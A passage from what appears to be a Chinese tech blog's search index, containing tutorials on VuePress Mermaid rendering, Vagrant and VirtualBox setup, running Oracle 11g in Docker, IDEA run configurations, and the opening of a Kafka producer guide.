Spring Java Format 的 Maven 代码格式化插件 使用 IDEA 的代码规范检测插件，基于 Spring 的 CheckStyle 规则文件 使用 Maven 的代码规范检测插件，基于 Spring 的 CheckStyle 规则文件 资源文件CheckStyle 规则文件 Nacos CheckStyle Google CheckStyle Spring CheckStyle IDEA 代码风格 XML 文件 Nacos Java Code Style For IDEA Google Java Code Style For IDEA 参考资料 Google All Style Guide Google Java Style Guide 使用 CheckStyle 来规范你的项目 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 开发工具"},{title:"VuePress 渲染 Mermaid 绘图",url:"/posts/bc19d204.html",text:'前言本文将介绍 VuePress 如何渲染 Mermaid 绘图，适用于 VuePress 1.x 与 VuePress 2.x。 VuePress 1.xVuePress 1.x 可以直接安装第三方插件 vuepress-plugin-mermaidjs 来渲染 Mermaid 绘图，插件的详细文档可看 这里。 安装插件安装插件时必须指定具体的版本号，否则默认会安装最新版本的插件，最新版本不兼容 VuePres 1.x。 1$ npm install vuepress-plugin-mermaidjs@1.9.1 -D 配置插件编辑 VuePress 1.x 的 .vuepress/config.js 配置文件，新增 mermaidjs 插件，如下所示： 12345module.exports = { plugins: [ \'vuepress-plugin-mermaidjs\' ]} Markdown 渲染语法说明 第二种写法：使用代码块（推荐） 第二种写法：使用 &lt;mermaid&gt; 标签 使用示例1234567&lt;mermaid&gt;sequenceDiagramAlice-&gt;John: Hello John, how are you?loop every minute John--&gt;Alice: Great!end&lt;/mermaid&gt; VuePress 2.x由于第三方插件 vuepress-plugin-mermaidjs 并没有适配最新版的 VuePress 2.x，因此需要手动配置 VuePress 2.x 来渲染 Mermaid 绘图。 安装依赖 让 VuePress 2.x 支持 Mermaid 1$ npm install mermaid -D 让 VuePress 2.x 支持自定义组件 1$ npm install @vuepress/plugin-register-components@next -D 配置 VuePress 2编辑 VuePress 2.x 的 .vuepress/config.ts 配置文件，指定自定义组件所在的目录，该目录下的 Vue 文件会被自动注册为 Vue 组件，详细介绍可以看 这里。 第一种配置方式 1234567891011import { registerComponentsPlugin } from \'@vuepress/plugin-register-components\'import { getDirname, path } from \'@vuepress/utils\'const __dirname = getDirname(import.meta.url)export default { plugins: [ registerComponentsPlugin({ componentsDir: path.resolve(__dirname, \'./components\'), }) ]} 第二种配置方式 1$ npm install app-root-path -D 1234567891011121314151617import path from \'path\'import appRoot from \'app-root-path\';import { registerComponentsPlugin } from \'@vuepress/plugin-register-components\'// 获取 ".vupress" 目录的绝对路径const __dirname = appRoot.resolve(\'./.vuepress/\');// 如果文档项目存放在工程的子目录中，比如在 "/docs" 文件夹，则写法如下// const __dirname = appRoot.resolve(\'./docs/.vuepress/\');export default { plugins: [ registerComponentsPlugin({ componentsDir: path.resolve(__dirname, \'./components\'), }) ]} 提示 上述的两种方式，都可以指定 VuePress 2.x 的自定义组件目录为 ./components，该目录默认存放在 .vuepress 目录下，即完整的自定义组件目录的路径是 .vuepress/components/。 自定义 Mermaid 组件在上面的自定义组件目录下，创建 mermaid.vue 源文件，例如源文件路径为 .vuepress/components/mermaid.vue，文件的内容如下： 1234567891011121314151617181920212223242526&lt;template&gt; &lt;div class="mermaid"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { mounted() { import("mermaid/dist/mermaid").then((m) =&gt; { m.initialize({ startOnLoad: true, }); m.init(); }); }, updated() { import("mermaid/dist/mermaid").then((m) =&gt; { m.initialize({ startOnLoad: true, }); m.init(); }); }};&lt;/script&gt; Markdown 渲染语法说明在 MarkDown 文件内添加 &lt;mermaid&gt; 标签，Mermaid 的内容需要使用 {{ 包裹住，并写在 &lt;mermaid&gt; 标签内（如下所示）。特别注意，&lt;mermaid&gt; 标签内不允许存在空行。 12345&lt;mermaid&gt;{{` ......（Mermaid 的内容）`}}&lt;/mermaid&gt; 使用示例流程图1234567891011&lt;mermaid&gt;{{`graph TB id1(圆角矩形)--普通线--&gt;id2[矩形]; subgraph 子图 id2==粗线==&gt;id3{菱形} id3-.虚线.-&gt;id4&gt;右向旗帜] id3--无箭头---id5((圆形)) end`}}&lt;/mermaid&gt; 时序图12345678910111213&lt;mermaid&gt;{{`sequenceDiagramAlice-&gt;&gt;John: Hello John, how are you?loop Healthcheck John-&gt;&gt;John: Fight against hypochondriaendNote right of John: Rational thoughts! John--&gt;&gt;Alice: Great! John-&gt;&gt;Bob : How about you? Bob--&gt;&gt;John : Jolly good!`}}&lt;/mermaid&gt; 饼图12345678910&lt;mermaid&gt;{{`pie title Key elements in Product X "Calcium" : 42.96 "Potassium" : 50.05 "Magnesium" : 10.01 "Iron" : 5`}}&lt;/mermaid&gt; 类别图12345678910111213141516171819202122232425&lt;mermaid&gt;{{`classDiagram Animal &lt;|-- Duck Animal &lt;|-- Fish Animal &lt;|-- Zebra Animal : +int age Animal : +String gender Animal: +isMammal() Animal: +mate() class Duck{ +String beakColor +swim() +quack() } class Fish{ -int sizeInFeet -canEat() } class Zebra{ +bool is_wild +run() }`}}&lt;/mermaid&gt; 甘特图123456789101112&lt;mermaid&gt;{{`ganttsection Section Completed: done, des1, 2014-01-06, 2014-01-08 Active : active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d`}}&lt;/mermaid&gt; 状态图12345678910111213141516171819&lt;mermaid&gt;{{`stateDiagram [*]--&gt;Active state Active { [*]--&gt;NumLockOff NumLockOff--&gt;NumLockOn : EvNumLockPressed NumLockOn--&gt;NumLockOff : EvNumLockPressed -- [*]--&gt;CapsLockOff CapsLockOff--&gt;CapsLockOn : EvCapsLockPressed CapsLockOn--&gt;CapsLockOff : EvCapsLockPressed -- [*]--&gt;ScrollLockOff ScrollLockOff--&gt;ScrollLockOn : EvCapsLockPressed ScrollLockOn--&gt;ScrollLockOff : EvCapsLockPressed }`}}&lt;/mermaid&gt; 实体关系图12345678&lt;mermaid&gt;{{`erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses`}}&lt;/mermaid&gt; 参考博客 Mermaid Docs Mermaid Support VuePress v2 How to use mermaid on Vuepress Has anyone gotten mermaid working ? var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"Rust 编程之道",url:"/posts/35ea9077.html",text:"",tags:"在线电子书"},{title:"Vagrant 快速创建 VirtualBox 虚拟机",url:"/posts/b9ff615e.html",text:'前言本文将介绍如何使用 Vagrant 在 VirtualBox 中快速创建 Linux 虚拟机，请提前在 Linux/Windows 本地操作系统里安装好 VirtualBox 虚拟机软件。 Vagrant 介绍Vagrant 简介Vagrant 是一个基于 Ruby 的开源工具，用于创建和部署虚拟化开发环境。Vagrant 可与 Hyper-V、VirtualBox、VMWare、Parallels 和 Libvirt 等虚拟化软件配合使用，致力于提供一种简易的方法来创建、配置和复制状态已知的虚拟机。它可以很方便地将预配置的虚拟机或设备从 Vagrant Cloud（镜像仓库）获取，并初始化后在系统上运行。简而言之，Vagrant 可以通过命令行快速创建 VirtualBox、VMWare 等虚拟机，主要用途类似 Docker（本质上的实现原理不一样）。 Vagrant 站点资源 Vagrant 官网 Vargrant 镜像仓库 Vargrant 官方文档 Vagrant GitHub 项目 Vagrant 安装Linux 系统Linux 系统执行以下命令安装 Vagrant 后，在终端输入命令 vagrant，若出现相关命令提示，则说明 Vagrant 安装成功。 特别注意 Linux 系统环境下，Vagrant 的虚拟机镜像下载目录是 ~/.vagrant.d，为了方便日后有足够的磁盘空间安装更多的虚拟机镜像，建议通过软链接的方式更改镜像存放的默认目录，例如： ln -sf /your_new_path ~/.vagrant.d Fedora123$ sudo dnf install -y dnf-plugins-core$ sudo dnf config-manager --add-repo https://rpm.releases.hashicorp.com/fedora/hashicorp.repo$ sudo dnf -y install vagrant CentOS/RHEL123$ sudo yum install -y yum-utils$ sudo yum-config-manager --add-repo https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo$ sudo yum -y install vagrant Debian/Ubuntu123$ wget -O- https://apt.releases.hashicorp.com/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg$ echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list$ sudo apt update &amp;&amp; sudo apt install vagrant Windows 系统Vagrant 官网 下载 EXE 安装包，然后直接安装即可。Vagrant 安装完成后，打开 CMD 窗口，输入命令 vagrant，若出现相关命令提示，则说明安装成功。 Vagrant 常用命令 命令 描述 vagrant box add 添加 box 的操作 vagrant box list 查看本地的 box 列表 vagrant box remove 删除本地的 box vagrant init 初始化 box 的操作，会生成 Vagrant 的配置文件 Vagrantfile vagrant up 启动本地虚拟机 vagrant ssh 通过 SSH 登录本地虚拟机 vagrant suspend 暂停本地虚拟机 vagrant resume 恢复本地虚拟机 vagrant package 将当前本地虚拟机打包成 box vagrant status 查看当前虚拟机的状态 vagrant global-status 显示当前用户下 Vagrant 所有虚拟机的状态 vagrant reload 更改了 Vagrantfile 后，使之生效（相当于先 halt，再 up） Vagrant 创建虚拟机创建 VirtualBox 虚拟机执行以下 init 命令，即可快速初始化一个 VirtualBox 虚拟机。值得一提的是，虚拟机初始化完成后，Vagrant 会在执行命令的当前目录下创建一个 Vagrantfile 文件。 1vagrant init centos/7 命令行中的 centos/7 代表需要初始化 CentOS 7 的虚拟机，如果需要初始化其他虚拟机直接替换它就可以，注意 / 符不能省略掉，例如初始化 Ubuntu 虚拟机的命令如下： 1vagrant init ubuntu/trusty64 提示 Vagrant 支持的虚拟机列表可以在右边这个网站查找到：https://app.vagrantup.com/boxes/search 启动 VirtualBox 虚拟机执行以下 up 命令，即可快速启动上面初始化好的 VirtualBox 虚拟机 1vagrant up Vagrant 首次启动 VirtualBox 虚拟机时，会从 Vagrant Cloud（镜像仓库）下载对应的镜像，CentOS 7 虚拟机完整的启动日志信息如下： 123456789101112131415161718192021222324252627282930313233343536373839404142Bringing machine \'default\' up with \'virtualbox\' provider...==&gt; default: Box \'centos/7\' could not be found. Attempting to find and install... default: Box Provider: virtualbox default: Box Version: &gt;= 0==&gt; default: Loading metadata for box \'centos/7\' default: URL: https://vagrantcloud.com/centos/7==&gt; default: Adding box \'centos/7\' (v2004.01) for provider: virtualbox default: Downloading: https://vagrantcloud.com/centos/boxes/7/versions/2004.01/providers/virtualbox.boxDownload redirected to host: cloud.centos.org default: Calculating and comparing box checksum...==&gt; default: Successfully added box \'centos/7\' (v2004.01) for \'virtualbox\'!==&gt; default: Importing base box \'centos/7\'...==&gt; default: Matching MAC address for NAT networking...==&gt; default: Checking if box \'centos/7\' version \'2004.01\' is up to date...==&gt; default: Setting the name of the VM: Vagrant_default_1663582821802_96925==&gt; default: Clearing any previously set network interfaces...==&gt; default: Preparing network interfaces based on configuration... default: Adapter 1: nat==&gt; default: Forwarding ports... default: 22 (guest) =&gt; 2222 (host) (adapter 1)==&gt; default: Booting VM...==&gt; default: Waiting for machine to boot. This may take a few minutes... default: SSH address: 127.0.0.1:2222 default: SSH username: vagrant default: SSH auth method: private key default: default: Vagrant insecure key detected. Vagrant will automatically replace default: this with a newly generated keypair for better security. default: default: Inserting generated public key within guest... default: Removing insecure key from the guest if it\'s present... default: Key inserted! Disconnecting and reconnecting using new SSH key...==&gt; default: Machine booted and ready!==&gt; default: Checking for guest additions in VM... default: No guest additions were detected on the base box for this VM! Guest default: additions are required for forwarded ports, shared folders, host only default: networking, and more. If SSH fails on this machine, please install default: the guest additions and repackage the box to continue. default: default: This is not an error message; everything may continue to work properly, default: in which case you may ignore this message.==&gt; default: Rsyncing folder: /home/centos/vagrant/ =&gt; /vagrant SSH 连接 VirtualBox 虚拟机VirtualBox 虚拟机系统启动后，Vagrant 会为我们自动创建 SSH 连接，因此我们不仅可以直接通过 VirtualBox 操作虚拟机系统，也可以通过 SSH 连接来操作。Vagrant 默认的 SSH 账号名称是 vagrant，登录密码是 vagrant，所以可以通过这种连接方式以 Vagrant 的账号连接虚拟机系统，命令如下： 1vagrant ssh 使用 SSH 连接到 VirtualBox 虚拟机系统后，若希望切换到 root 用户，可以在终端输入下命令，root 用户的默认密码是 vagrant 1$ su root VirtualBox 虚拟机网络配置默认情况下，Vagrant 创建虚拟机后，使用的是网络地址转换和端口转发的方式来解决本地系统和虚拟机网络地址映射的问题，如下图所示。在实际使用过程中，网络地址转换和端口转发的方式可能不太方便。举个例子，在虚拟机中装了很多软件服务，比如 MySQL 数据库，Redis 等等，在虚拟机内部使用是没有问题的。MySQL 数据库的端口默认是 3306，但在本地系统中，虚拟机给我们映射出来的端口可能就不是 3306 了，这对于在本地系统上进行测试是及其不方便的。因此，若不希望使用这种默认的方式，可以设置一个私有的 IP 实现本地系统和虚拟机系统之间的互通。 在本地系统（宿主机）内执行以下命令，找到 VirtualBox 的虚拟网卡地址，例如 192.168.56.2 1$ ip addr 或者 1$ ifconfig -a 编辑 Vagrantfile 文件，找到如下的一行内容，去掉注释并更改 IP 地址，例如 192.168.56.10。特别注意，其中的网段 192.168.56 是固定的，而 10 可以换成其他的，最大不要超过 255 就可以 1config.vm.network "private_network", ip: "192.168.56.10" 重新加载 Vagrantfile 配置文件，Vagrant 会自动重启虚拟机系统 1vagrant reload 虚拟机系统重启完成后，在本地系统和虚拟机之间互相执行 Ping 操作，如果互相能 Ping 得通，说明网络配置成功，操作步骤如下： 在虚拟机中 Ping 本地系统的 IP 地址 1ping 192.168.56.2 在本地系统中 Ping 虚拟机的 IP 1ping 192.168.56.10 VirtualBox 虚拟机硬件资源配置由于 Vagrant 创建 VirtualBox 虚拟机时，默认只会分配较少的处理器（CPU）和内存资源，因此需要在 VirtualBox 的用户界面里手动更改虚拟机的硬件资源配置，如下图所示： VirtualBox 虚拟机启用账号密码登录Vagrant 创建的 VirtualBox 虚拟机默认只支持 SSH 登录方式，为了后续操作方便，比如上传文件或者 SSH 远程连接，可以配置允许使用账号密码登录，步骤如下： 编辑 sshd 服务的配置文件 1$ sudo vi /etc/ssh/sshd_config 将 PasswordAuthentication 改为 yes 1PasswordAuthentication yes 重启 sshd 服务 1$ sudo service sshd restart Vagrant 打包 Box为了方便将本地的虚拟机备份或者分发到互联网上，可以将让 Vagrant 将虚拟机打包成 Box 文件。 特别注意 在执行打包命令之前，建议将 Vagrantfile 配置文件中的虚拟网络配置注释掉，否则以后通过添加 Box 的方式恢复虚拟机时，虚拟机可能会无法正常启动 例如，在执行打包命令之前，注释掉 Vagrantfile 配置文件中的 config.vm.network "private_network", ip: "192.168.56.10" 打包命令 命令格式：vagrant package --base {packagename} --output {/path/packagename.box} 命令参数：--base：当前本地要打包的虚拟机，--output：打包导出的文件的路径，{packagename}：Box 的包名（唯一标识） 打包示例 查看虚拟机列表 1vboxmanage list vms 虚拟机列表如下 12"php-centos7" {4b663e7c-ba60-4026-9330-64c2e6d6d1c4}"java-centos7" {7b1cf3a0-72e0-4d47-9a93-6aae4c701390} 打包虚拟机 1vagrant package --base php-centos7 --output ./php-centos7.box Vagrant 添加 Box从互联网上下载或者本地虚拟机打包得到的 Box 文件，可以通过 Vagrant 命令将 Box 添加到本地，然后就可以创建并启动对应的虚拟机，这类似 备份 --&gt; 恢复。 添加命令 命令格式：vagrant box add {packagename} {/path/packagename.box} 命令参数：{packagename}：Box 的包名（唯一标识），{/path/packagename.box}：Box 文件的本地路径 添加示例12345678# 添加本地的 Boxvagrant box add php-server-centos7 ./php-centos7.box# 创建虚拟机vagrant init php-server-centos7# 启动虚拟机vagrant up 提示 1、vagrant box add 命令除了可以指定 Box 文件的本地路径之外，还可以指定 Box 文件的网络地址（镜像源 URL），借此就可以加快镜像的下载速度 2、若是 Vagrant 添加的是本地虚拟机导出的 Box 文件，那么创建虚拟机后，一般还需要在 VirtualBox 的界面上手动更改虚拟机的 Mac 地址，否则虚拟机启动后会存在 Mac 地址冲突的问题 Vagrant 设置第三方镜像源为了提高 Vagrant 镜像的下载速度，可以在 这里 找到自己想要的镜像源（URL），然后使用指定的镜像源来添加 Box，最后再创建并启动虚拟机。 12345678# 使用指定的镜像源（URL）来添加 Boxvagrant box add {packagename} {url}# 创建虚拟机vagrant init {packagename}# 启动虚拟机vagrant up CentOS 7 虚拟机系统配置若安装的是 CentOS 7 虚拟机，可以执行以下操作来配置虚拟机操作系统（可选操作）。值得一提的是，以下操作都需要以 root 用户身份执行。 更换 YUM 源1234567891011# 备份原YUM源# mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak# 使用阿里云的YUM源# curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo# 清理数据# yum clean all# 生成缓存# yum makecache 安装 EPEL 源1# yum install -y epel-release 安装软件1# yum install -y vim tree htop tmux net-tools telnet wget curl 时间同步1234567891011121314# 由于Centos7默认使用chronyd来同步时间，如果需要安装其他时间同步服务（ntpd），则需要禁用chronyd# systemctl disable chronyd# 安装ntp服务# yum install -y ntp# 开机启动ntp服务# systemctl enable ntpd# 启动ntp服务# systemctl start ntpd# 查看ntp服务的运行状态# systemctl status ntpd 1234567891011# 使用ntp手动同步时间# ntpdate pool.ntp.org# 设置亚洲时区# timedatectl set-timezone Asia/Shanghai# 启用ntp同步# timedatectl set-ntp yes# 查看当前系统时间、时间同步状态# timedatectl status 安装 Docker Docker 安装 123456789101112131415161718192021# 卸载旧版本的Docker# yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine# 添加YUM仓库# yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo# 安装Docker# yum install -y docker-ce docker-ce-cli containerd.io# 启动Docker# systemctl start docker# 开机启动Docker# systemctl enable docker Docker 镜像加速 针对 Docker 客户端版本大于 1.10.0 的用户，可以通过修改 daemon 的配置文件 /etc/docker/daemon.json 来使用阿里云的镜像加速。值得一提的是，使用镜像加速之前，需要在阿里云平台注册账号，并开通容器镜像服务。 12345# 创建配置文件的目录# mkdir -p /etc/docker# 创建配置文件，并写入以下JSON内容# vi /etc/docker/daemon.json 123{ "registry-mirrors": ["https://82m9ar63.mirror.aliyuncs.com"]} 12345# 重载配置文件# systemctl daemon-reload# 重启Docker# systemctl restart docker 常见问题打包虚拟机后无法恢复运行问题描述 打包虚拟机后，通过添加 Box 的方式让虚拟机恢复运行，但虚拟机在启动时一直卡在 SSH auth method 阶段 1234567891011121314Bringing machine \'default\' up with \'virtualbox\' provider...==&gt; default: Importing base box \'Vagrant-Gulimall-CentOS7\'...==&gt; default: Matching MAC address for NAT networking...==&gt; default: Setting the name of the VM: centos7==&gt; default: Clearing any previously set network interfaces...==&gt; default: Preparing network interfaces based on configuration... default: Adapter 1: nat==&gt; default: Forwarding ports... default: 22 (guest) =&gt; 2222 (host) (adapter 1)==&gt; default: Booting VM...==&gt; default: Waiting for machine to boot. This may take a few minutes... default: SSH address: 127.0.0.1:2222 default: SSH username: vagrant default: SSH auth method: private key 解决方案 第一种方案：在执行打包命令之前，将 Vagrantfile 配置文件中的虚拟网络配置注释掉（如下），然后再执行打包命令 1# config.vm.network "private_network", ip: "192.168.56.10" 第二种方案：虚拟机恢复运行失败后，往 Vagrantfile 配置文件添加以下配置内容，然后重新启动虚拟机 123config.ssh.username = "root"config.ssh.password = "vagrant"config.ssh.insert_key = "true" 第三种方案：将要打包的虚拟机所在目录下的 private_key 秘钥文件（路径如下）复制一份，并拷贝覆盖到要恢复运行的虚拟机所在目录下，然后重新启动虚拟机 1/xxxx/.vagrant/machines/default/virtualbox/private_key 第四种方案：如果虚拟机还是无法正常启动，可以使用 --debug 参数来获取详细的启动日志信息 1$ vagrant up --debug 相关资料 Vagrant 导出的 Box 不能启动 Fix Vagrant ssh authentication failure after packaging vagrant box 虚拟机挂载共享目录失败问题描述 虚拟机启动时，提示无法挂载 VirtualBox 的共享目录 123456789101112Vagrant was unable to mount VirtualBox shared folders. This is usuallybecause the filesystem "vboxsf" is not available. This filesystem ismade available via the VirtualBox Guest Additions and kernel module.Please verify that these guest additions are properly installed in theguest. This is not a bug in Vagrant and is usually caused by a faultyVagrant box. For context, the command attempted was:mount -t vboxsf -o uid=0,gid=0,_netdev vagrant /vagrantThe error output from the command was:mount: unknown filesystem type \'vboxsf\' 解决方案 先将 VirtualBox 虚拟机关闭掉 1$ vagrant halt 执行以下命令安装 vagrant-vbguest 插件 1$ vagrant plugin install vagrant-vbguest 1234Installing the \'vagrant-vbguest\' plugin. This can take a few minutes...Fetching micromachine-3.0.0.gemFetching vagrant-vbguest-0.31.0.gemInstalled the plugin \'vagrant-vbguest (0.31.0)\'! 插件安装完成后，重新启动虚拟机 1$ vagrant up 虚拟机正常启动后，建议执行以下命令卸载插件（可选操作） 1$ vagrant plugin uninstall vagrant-vbguest 在卸载插件时，可以忽略 Vagrant 输出的错误信息，然后使用以下命令查看插件是否成功卸载 1$ vagrant plugin list 相关资料 Vagrant was unable to mount VirtualBox shared folders 参考博客 超详细的 Vagrant 上手指南 Linux VirtualBox Vagrant 安装使用教程 VirtualBox + Vagrant 安装 VirtualBox 虚拟机 VirtualBox + Vagrant + Centos7，安装 Docker var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化 开发工具"},{title:"Docker 安装 Oracle 11g 数据库",url:"/posts/e33a339c.html",text:'前言Docker 镜像本文直接使用 DockerHub 平台上的 Oracle 11g 镜像，基于 Ubuntu 18.04 LTS 系统，数据库版本是 Oracle Express Edition 11g Release 2（11.2.0.2.0）。 Oracle 版本列表在 Oracle 数据库的发展中，数据库一直处于不断升级状态，一共有以下几个版本： Oracle 8i：Oracle 8i 表示 Oracle 正式向 Internet 上发展，其中 i 表示就是 internet。 Oracle 9i：Oracle 8i 是一个过渡版本，Oracle 9i 是一个更加完善的数据库版本。 Oracle 10g：g 表示 grid，代表网格的意思，即这种数据库采用网格计算的方式进行操作。 Oracle 11g：是 Oracle 10g 的稳定版本，Oracle 11g 是目前使用最广泛的版本。 Oracle 12c：是 Oracle 2013 年推出的数据库版本，c 代表 Cloud，代表云计算的意思，同时 Oracle 12c 支持大数据的处理能力。 Oracle 18c、Oracle 19c 是对 12c 版本的完善和发展。 快速开始拉取镜像1# docker pull quay.io/maksymbilenko/oracle-12c 启动容器 启动容器 1# docker run -d -p 1521:1521 --name oracle-11g oracleinanutshell/oracle-xe-11g 允许远程连接 1# docker run -d -p 1521:1521 --name oracle-11g -e ORACLE_ALLOW_REMOTE=true oracleinanutshell/oracle-xe-11g 出于性能考虑，启动容器时可能需要禁用磁盘异步 IO 1# docker run -d -p 1521:1521 --name oracle-11g -e ORACLE_DISABLE_ASYNCH_IO=true oracleinanutshell/oracle-xe-11g 使用默认密码启用 XDB 用户（xdb） 1# docker run -d -p 1521:1521 --name oracle-11g -e ORACLE_ENABLE_XDB=true oracleinanutshell/oracle-xe-11g 启动 APEX 用户 1# docker run -d -p 1521:1521 --name oracle-11g -p 8080:8080 oracleinanutshell/oracle-xe-11g 123# 登录 http://localhost:8080/apex/apex_admin 并使用以下账号username: ADMINpassword: admin 对于最新的 APEX（18.1）用户，请先拉取 oracleinanutshell/oracle-xe-11g:18.04-apex 镜像 1# docker run -d -p 1521:1521 --name oracle-11g -p 8080:8080 oracleinanutshell/oracle-xe-11g:18.04-apex 123# 登录 http://localhost:8080/apex/apex_admin 并使用以下账号username: ADMINpassword: Oracle_11g Oracle 连接密码默认情况下，密码验证是禁用的（密码永不过期），可以使用以下配置信息连接 Oracle 数据库 12345hostname: localhostport: 1521sid: xeusername: systempassword: oracle 提示 SYS 和 SYSTEM 用户的默认密码都是 oracle。 Oracle 连接测试 连接 Docker 容器 1# docker exec -it oracle-11g /bin/bash 切换到 sqlplus 操作 1# sqlplus /nolog 连接 Oracle 11g 数据库 12345# 连接Oracle数据库SQL&gt; conn system/oracle# 查看Oracle的版本信息SQL&gt; SELECT BANNER FROM V$VERSION; Docker-Compose 使用12345678version: \'3\'services: oracle-db: image: oracleinanutshell/oracle-xe-11g:latest ports: - 1521:1521 - 8080:8080 Java 连接 Oracel 数据库下载 Oracle 驱动包由于 Oracle 授权的问题，无法从 Maven 中央仓库下载 Oracle 的数据库驱动包，Oracle 11g 的数据库驱动包可以 点击这里 下载得到。 Maven 引入 Oracle 驱动包将 Oralce 数据库驱动包存放到项目中的 lib 目录下，然后使用以下方式让 Maven 引入驱动包依赖。当然也可以使用其他方式引入，例如直接使用 Maven 命令 mvn install 将驱动包安装到本地仓库，接着按照平时的方式直接引入驱动包依赖即可，这里不再累述。 1234567&lt;dependency&gt; &lt;groupId&gt;oracle&lt;/groupId&gt; &lt;artifactId&gt;ojdbc6&lt;/artifactId&gt; &lt;version&gt;11.2.0.2.0&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${project.basedir}/lib/ojdbc6.jar&lt;/systemPath&gt;&lt;/dependency&gt; 配置 Oracle 的 JDBC 连接信息1234driver-class-name=oracle.jdbc.OracleDriverurl=jdbc:oracle:thin:@localhost:1521:xeusername=systempassword=oracle 提示 更多关于 Java 连接 Oracle 数据库的教程内容，可以查看教程 《MyBatis-Plus 中 如何生成 Oralce 的主键》。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"数据库 容器化"},{title:"IDEA 一键启动多个服务并配置占用内存的大小",url:"/posts/9577b09a.html",text:'配置一键启动多个服务 第一步： 选中项目，然后点击工具栏的 Edit Configurations 进入配置界面 第二步： 在弹出的配置界面中，点击左上角加号 +，选中 Compound 第三步： 选中创建出来的 Compound，点击右侧的加号 +，将需要一键启动的服务都加进去，然后更改名称 第四步骤： 选中已创建的 Compound，然后点击工具栏的绿色三角按钮，即可一键启动多个服务 配置服务占用内存的大小 第一步： 选中项目，然后点击工具栏的 Edit Configurations 进入配置界面 第二步： 选中需要配置内存大小的服务，然后点击右侧的 Environment 项，指定 VM options 的内容为 -Xmx512m JVM 参数 参数说明 -Xms JVM 启动时分配的内存大小 -Xmx JVM 运行过程中分配的最大内存大小 -Xmn JVM 堆内存中新生代的大小 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Kafka 入门教程之二",url:"/posts/60ddcede.html",text:'Kafka 生产者生产者消息发送流程生产者消息发送原理Kafka 的 Producer 发送消息采用的是异步发送的方式。在消息发送的过程中，涉及到了两个线程 — main 线程和 Sender 线程。在 main 线程中，会创建一个双端队列 RecordAccumulator。值得一提的是，main 线程将消息发送给 RecordAccumulator 时，Sender 线程会不断从 RecordAccumulator 中拉取消息并发送到 Kafka Broker。 